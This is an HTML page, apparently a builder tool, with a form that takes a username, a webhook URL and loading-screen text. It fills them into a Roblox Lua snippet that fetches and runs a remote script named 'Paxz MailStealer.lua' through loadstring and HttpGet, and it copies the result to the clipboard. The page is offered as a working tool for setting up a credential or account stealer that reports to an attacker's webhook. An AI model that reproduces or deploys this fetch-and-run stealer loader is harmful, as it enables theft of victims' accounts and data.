<!DOCTYPE html>
<html>
  <head>
    <title>GitHub HTML-pagina</title>
    <style>
      body {
        background-image: url("https://4kwallpapers.com/images/wallpapers/galaxy-milky-way-stars-deep-space-colorful-astronomy-nebula-2880x1800-5366.jpg");
        background-size: cover;
      }
      input[type="text"] {
        padding: 10px;
        margin: 10px;
        width: 80%;
      }
      #output {
        padding: 10px;
        margin: 10px;
        width: 80%;
        background-color: #fff;
      }
      #submit {
        padding: 10px;
        margin: 10px;
        width: 80%;
        background-color: #4CAF50;
        color: #fff;
        border: none;
        border-radius: 4px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <h1>GitHub HTML-pagina</h1>
    <form>
      <label for="username">Username:</label>
      <input type="text" id="username" name="username"><br>

      <label for="webhook">Webhook:</label>
      <input type="text" id="webhook" name="webhook"><br>

      <label for="loadingtext">LoadingText:</label>
      <input type="text" id="loadingtext" name="loadingtext"><br>

      <label for="script">Script:</label>
      <input type="text" id="script" name="script" value='&#95;G.UserName = ""<br>
&#95;G.Webhook = ""<br>
&#95;G.loadingScreenText = ""<br><br>
loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua"))()'><br>

      <input type="button" value="Copy to Clipboard" onclick="copyScript()">
    </form>
    
    <script>
      function copyScript() {
        const script = document.getElementById("script").value
          .replace("&#95;", "_")
          .replace(/<br>/g, "\n");
        navigator.clipboard.writeText(script);
      }
      
      const username = document.getElementById("username");
      const webhook = document.getElementById("webhook");
      const loadingtext = document.getElementById("loadingtext");
      
      function updateScript() {
        const script = document.getElementById("script");
        const newScript = script.value
          .replace(/"_G.UserName = .+"/, `"_G.UserName = \\"${username.value}\\";"`)
          .replace(/"_G.Webhook = .+"/, `"_G.Webhook = \\"${webhook.value}\\";"`)
          .replace(/"_G.loadingScreenText = .+"/, `"_G.loadingScreenText = \\"${loadingtext.value}\\";"`);
        script.value = newScript;
      }
      
      username.addEventListener("input", updateScript);
      webhook.addEventListener("input", updateScript);
      loadingtext.addEventListener("input", updateScript);
    </script>
  </body>
</html>
